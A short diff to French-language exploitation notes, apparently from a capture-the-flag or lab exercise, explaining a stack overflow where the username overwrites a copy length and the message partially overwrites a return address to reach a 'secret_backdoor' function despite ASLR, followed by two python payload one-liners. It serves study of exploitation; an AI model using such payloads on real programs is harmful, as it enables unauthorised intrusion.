@@ -74,6 +74,15 @@ donc faut ecrire 202 = 0xCA ?
 
 l'adresse de la backdoor c'est 0x88c
 
+# Explication
+Il y a deux moments d'écriture en mémoire: le username et le msg.
+Avec le username on peut overwrite sur la stack la taille de msg qui va être copiée
+sur la stack.
+Avec le msg on peut donc overwrite l'adresse de return pour la remplacer par
+l'adresse de la fonction 'secret_backdoor' mais ATTENTION: on ne veut modifier
+que les 2 premiers octets de l'adresse de 8 octets. En effet, ASLR va randomizer
+le reste de l'adresse à chaque exécution du programme.
+
 Exploit:
 username: python -c 'print("A" * 40 + "\xCA")'
 msg: python -c 'print(200 * "B" + "\x8c" + "\x08")'
